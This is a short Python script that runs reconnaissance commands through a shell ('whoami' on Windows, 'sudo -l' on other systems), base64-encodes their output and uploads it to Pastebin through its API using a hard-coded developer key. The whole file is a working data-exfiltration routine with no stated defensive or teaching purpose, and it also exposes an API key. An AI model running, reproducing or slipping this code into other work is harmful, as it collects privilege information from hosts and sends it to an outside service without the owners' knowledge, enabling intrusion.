import subprocess
import requests
import base64
import os

def upload_pastebin(data):
    
    url = 'https://pastebin.com/api/api_post.php'
    api_data = {
        'api_dev_key' : '338-8BnLQ_mXjx38nihHC8P8mBTFqxSc',
        'api_paste_code': data,
        'api_paste_name': "Result",
        'api_option': 'paste'
    }
    
    try:
        req = requests.post(url, data=api_data)
        print("Uploaded: ", req.text)
    except:
        print(Exception)

def run_cmd(cmd):
    results = []
    for commands in cmd:
        new_process = subprocess.Popen(args=commands, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
        output, error = new_process.communicate()
        if error != b'':
            print(error)
        else:
            results.append(output.decode())

    results = "\n".join(results)
    upload_pastebin(base64.b64encode(results.encode()))


def main():
    cmd = []
    if os.name == "nt":
        cmd.append("whoami")
    else:
        cmd.append("sudo -l")
    run_cmd(cmd)

main()
